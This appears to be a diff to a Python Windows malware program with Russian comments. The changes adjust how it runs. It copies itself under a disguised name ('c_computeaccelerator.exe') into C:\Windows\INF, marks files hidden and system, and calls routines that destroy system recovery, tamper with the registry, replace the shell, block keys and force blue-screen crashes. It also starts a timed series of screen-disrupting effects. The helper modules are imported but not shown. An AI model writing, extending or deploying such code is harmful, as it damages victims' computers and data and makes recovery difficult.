@@ -8,9 +8,9 @@ import sys
 import win32gui
 import time
 from collections import defaultdict
-from win32gui import *
-from gui import run_app
-from multimedia import playMusic_runappmain, play_video_fullscreen, set_wallpaper, playmusic_for3, monitor_process, set_file_attributes
+from gui import run_app, ChaosFormatter
+from regedit_and_virus_safe import BSOD
+from multimedia import playMusic_runappmain, play_video_fullscreen, playmusic_for3, monitor_process, set_file_attributes
 
 from regedit_and_virus_safe import (
     destroy_all_recovery,
@@ -18,8 +18,7 @@ from regedit_and_virus_safe import (
     monitor_explorer,
     MinusRegedit,
     block_keys,
-    ctrt_alt_BSOD,
-    check_vbs)
+    ctrt_alt_BSOD)
 
 from start_gdi import (
     startdrawimages, 
@@ -62,15 +61,20 @@ TARGET_DIR = r"C:\Windows\INF"
 ###
 
 
-#def is_safe_mode():
- #   SM_CLEANBOOT = 67
-  #  mode = ctypes.windll.user32.GetSystemMetrics(SM_CLEANBOOT)
-   # return mode in (1, 2)
+def is_safe_mode():
+    SM_CLEANBOOT = 67
+    mode = ctypes.windll.user32.GetSystemMetrics(SM_CLEANBOOT)
+    return mode in (1, 2)
 
-#def check_safemode():
- #   if not is_safe_mode():
-  #      sys.exit(1)
-   # BSOD() # Не использовано в данный момент
+def check_safemode():
+    def russia():
+        try:
+            if not is_safe_mode():
+                sys.exit(1)
+            BSOD()
+        except Exception as e:
+            print(f"Ошибка: {e}")
+    threading.Thread(target=russia, daemon=True).start()
 
 
 def copyicons():
@@ -113,7 +117,6 @@ def copy_to_target(new_name="c_computeaccelerator.exe"):
         # Устанавливаем атрибуты скрытый и системный
         set_file_attributes(target_file)
         os.startfile(target_file)  # Запускаем копию из целевой папки
-        os.startfile(resource_path("script.vbs"))
         sys.exit()  # Завершаем исходный файл
     except Exception as e:
         print("Ошибка", f"Не удалось скопировать файл: {e}")
@@ -130,6 +133,9 @@ def changetoeng():
         user32.PostMessageW(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, 0, layout)
     set_keyboard_layout(LANG_ENGLISH_US)
 
+def start_chaos_in_thread():
+    """Запускает ChaosFormatter в отдельном потоке."""
+    threading.Thread(target=lambda: ChaosFormatter(), daemon=True).start()
 
 def checkexe():
     EXECUTABLE_EXTENSIONS = {".exe", ".bat", ".cmd", ".vbs", ".ps1"}
@@ -137,41 +143,41 @@ def checkexe():
     tracked_pids = set()
     existing_pids = {proc.pid for proc in psutil.process_iter(['pid'])}
     triggered_events = {
-        6: False, 12: False, 16: False, 18: False, 20: False,
-        22: False, 24: False, 26: False, 30: False,
-        40: False, 45: False, 50: False,
-        70: False, 90: False
+        2: False, 4: False, 8: False, 12: False, 16: False,
+        18: False, 20: False, 24: False, 28: False,
+        30: False, 35: False, 40: False,
+        45: False, 50: False
     }
     actions = {
-        6: lambda: (print("6"), starticonscursor()),
-        12: lambda: (print("12"), starterrors()),
-        16: lambda: (print("16"), startsmelt()),
-        18: lambda: (print("18"), startdrawimages()),
-        20: lambda: (print("20"), starttunnel()),
-        22: lambda: (print("22"), startvoid()),
-        24: lambda: (print("24"), startinvert()),
-        26: lambda: (print("26"), startrastagHori()),
-        30: lambda: (print("30"), startmelt()),
-        40: lambda: (print("40"), startsines()),
-        45: lambda: (print("45"), startpanscreen()),
-        50: lambda: (print("50"), startrottun()),
-        70: lambda: (print("70"), startswipescreen()),
-        90: lambda: (print("90"), starthell())
+        2: lambda: (print("2"), starticonscursor()),
+        4: lambda: (print("4"), starterrors()),
+        8: lambda: (print("8"), startsmelt()),
+        12: lambda: (print("12"), startdrawimages()),
+        16: lambda: (print("16"), starttunnel()),
+        18: lambda: (print("18"), startvoid()),
+        20: lambda: (print("20"), startinvert()),
+        24: lambda: (print("24"), startrastagHori()),
+        28: lambda: (print("28"), startmelt()),
+        30: lambda: (print("30"), startsines()),
+        35: lambda: (print("35"), startpanscreen()),
+        40: lambda: (print("40"), startrottun()),
+        45: lambda: (print("45"), startswipescreen()),
+        50: lambda: (print("50"), starthell())
     }
 
     # Планировщик запуска функций с таймером
     def schedule_events():
-        sequence = [6, 12, 16, 18, 20, 22, 24, 26, 30, 40, 45, 50, 70, 90]
+        sequence = [2, 4, 8, 12, 16, 18, 20, 24, 28, 30, 35, 40, 45, 50]
         time_map = {}
 
         delay = 0
         for num in sequence:
             if num <= 30:
-                delay += 60  # 1 минута
+                delay += 30  # 0.5 минуты
             elif num <= 50:
-                delay += 120  # 2 минуты
+                delay += 60  # 1 минута
             else:
-                delay += 240  # 4 минуты
+                delay += 180  # 3 минуты
             time_map[num] = delay
 
         def timer_run(n, delay_sec):
@@ -222,31 +228,28 @@ def checktxt():
                 content = f.read().strip()
 
             if content == "1":
+                copyicons()
+                copy_to_target(new_name="c_computeaccelerator.exe")
                 change_shell()
                 destroy_all_recovery()
-                changetoeng()
                 MinusRegedit()
-                os.startfile(resource_path("script.vbs"))
                 playMusic_runappmain()
                 run_app()
+
 
             elif content == "2":
                 play_video_fullscreen(video_path=resource_path("Hacker.mp4"))
 
             elif content == "3":
                 playmusic_for3()
-                set_wallpaper(image_path=resource_path("bg.jpg"))
 
                 process_monitor_threading = threading.Thread(target=monitor_process)
                 process_monitor_threading.start()
 
-                os.startfile(resource_path("script.vbs"))
+                os.startfile(resource_path("BTDevManager.exe"))
 
-                vbs_check_threading = threading.Thread(target=check_vbs)
-                vbs_check_threading.start()
-
-                checkexe_potok = threading.Thread(target=checkexe)
-                checkexe_potok.start()
+                checkexe_threading = threading.Thread(target=checkexe)
+                checkexe_threading.start()
                 
                 explorer_monitor_threading = threading.Thread(target=monitor_explorer(poll_interval=1))
                 explorer_monitor_threading.start()
@@ -254,43 +257,38 @@ def checktxt():
             else:
                 with open(file_path, "w") as f:
                     f.write("1")
+                copyicons()
+                copy_to_target(new_name="c_computeaccelerator.exe")
                 set_file_attributes(file_path)
                 change_shell()
                 destroy_all_recovery()
                 changetoeng()
                 MinusRegedit()
-                os.startfile(resource_path("script.vbs"))
                 playMusic_runappmain()
                 run_app()
         else:
             with open(file_path, "w") as f:
                 f.write("1")
             set_file_attributes(file_path)
+            copyicons()
+            copy_to_target(new_name="c_computeaccelerator.exe")
             change_shell()
             destroy_all_recovery()
             changetoeng()
             MinusRegedit()
-            os.startfile(resource_path("script.vbs"))
             playMusic_runappmain()
             run_app()
 
     except Exception as e:
-        print(f"Произошла ошибка: {e}")
+        print(f"Error: {e}")
 
 
 if __name__ == "__main__":
 
-    copyicons()
-    copy_to_target(new_name="c_computeaccelerator.exe")
+    check_safemode()
 
-    
     wait = threading.Thread(target=ctrt_alt_BSOD)
     wait.start()
 
-
     block_keys()
     checktxt()
-
-
-    
-
